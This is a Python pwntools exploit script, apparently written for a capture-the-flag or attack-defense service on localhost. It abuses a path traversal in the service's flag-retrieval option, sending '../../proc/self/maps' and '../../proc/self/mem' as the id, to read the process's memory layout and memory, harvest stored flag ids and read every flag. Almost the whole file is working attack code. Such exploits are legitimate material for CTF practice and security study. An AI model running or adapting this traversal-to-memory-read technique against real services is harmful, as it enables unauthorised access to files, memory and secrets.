from pwn import *


def flag_store(flag):
    r.sendlineafter(b'--> ', b'1')
    r.sendlineafter(b': ', flag.encode())
    r.recvuntil(b': ')
    flag_id = r.recvuntil(b'\n').decode()

    return flag_id


def flag_retrieve(flag_id, offset):
    r.sendlineafter(b'--> ', b'2')
    r.sendlineafter(b': ', flag_id.encode())
    r.sendlineafter(b': ', str(offset).encode())
    flag = r.recvuntil(b'\n').decode()

    return flag

def flag_list():
    r.sendlineafter(b'--> ', b'3')
    flags = r.recvuntil(b'[1]').decode().split('\n')

    return flags
  


print('[*] Connecting')
r = remote('localhost', 52420)

print('[*] Listing flags')
flag_list()

print('[*] Dumping /proc/self/maps')
maps = ''
i = 0
while True:
    res = flag_retrieve('../../proc/self/maps', i)
    l = min(len(res), 30)
    res = res[:l]

    maps += res
    print(res, end='')

    i += l

    if 'stack' in res:
        break
    
maps = maps.split('\n')[:-1]

res_vma_start = 0
for i in maps:
    start, end = i.split(' ')[0].split('-')
    start = int(start, 16)
    end = int(end, 16)

    if end - start > 2 ** 32:
        print('[+] Found flag ids vma: ', i)
        res_vma_start = start
        break

if res_vma_start <= 0:
    print('[-] Could not find flag ids vma')
    exit(1)


flag_ids = []

print('[*] Dumping flag ids')
i = 5
while True:
    res = flag_retrieve('../../proc/self/mem', res_vma_start + i)
    if len(res) < 4:
        break

    print(res.encode())
    flag_ids.append(res[:-1])
    i += 17

if len(flag_ids) <= 0:
    print('[-] Couldnt find any flag ids')
    exit(1)

print('[+] Got flag ids: ', flag_ids)

print('[*] Reading flags')
for i in flag_ids:
    print(flag_retrieve(i, 0))

